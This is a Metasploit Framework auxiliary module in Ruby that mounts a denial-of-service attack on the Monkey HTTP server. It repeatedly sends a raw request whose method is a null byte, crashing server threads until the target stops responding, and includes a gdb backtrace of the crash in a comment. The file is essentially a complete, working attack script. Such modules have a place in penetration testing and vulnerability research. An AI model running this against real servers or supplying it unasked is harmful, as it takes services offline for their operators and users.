##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Monkey HTTPD Null Byte Request',
			'Description'    => %q{
				Sending a request containing null bytes causes a
			thread to crash.  If you crash all of the threads,
			the server becomes useless.
			},
			'Author'         =>
				[
					'Doug Prostko <dougtko[at]gmail[dot]com>'
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['URL' => 'http://monkey-project.com'],
				],
			'DisclosureDate' => ''))

		register_options(
			[
				Opt::RPORT(2001),
			], self.class)
	end

	def is_alive
		begin
			connect
			res = send_request_raw({
				'method' => "GET",
				'uri' => "/"
			})
			if res == nil
				raise ::Rex::ConnectionTimeout
			end
		rescue ::Rex::ConnectionTimeout
			print_good("Monkey server is down!")
		ensure
			disconnect
		end
		return res
	end

	# [2013/05/24 17:35:34] [   Info] HTTP Server started

	# Program received signal SIGSEGV, Segmentation fault.
	# [Switching to Thread 0xb6de1b40 (LWP 30602)]
	# 0xb7e7b8a1 in ?? () from /lib/i386-linux-gnu/libc.so.6
	# (gdb) bt
	# #0  0xb7e7b8a1 in ?? () from /lib/i386-linux-gnu/libc.so.6
	# #1  0x08050314 in mk_string_char_search_r ()
	# #2  0x0804b8c2 in mk_handler_write ()
	# #3  0x08050c00 in mk_conn_write ()
	# #4  0x0804f54a in mk_epoll_init ()
	# #5  0x0804ff07 in mk_sched_launch_worker_loop ()
	# #6  0xb7f9fd78 in start_thread ()
	#    from /lib/i386-linux-gnu/libpthread.so.0
	# #7  0xb7ed63de in clone () from /lib/i386-linux-gnu/libc.so.6
	def run
		loop do
			begin
				if ! is_alive
					break
				end
				connect
				print_status("Sending DoS packet to #{rhost}:#{rport}")

				res = send_request_raw({
					'method' => "\x00",
					'uri' => ""
				}, timeout = 1)
				disconnect
			rescue ::Rex::ConnectionRefused
				print_status("Unable to connect to #{rhost}:#{rport}.")
			rescue ::Errno::ECONNRESET
				print_status("DoS packet successful. #{rhost} not responding.")
			rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
				print_status("Couldn't connect to #{rhost}:#{rport}.")
			rescue ::Timeout::Error, ::Errno::EPIPE
			end
		end
	end
end
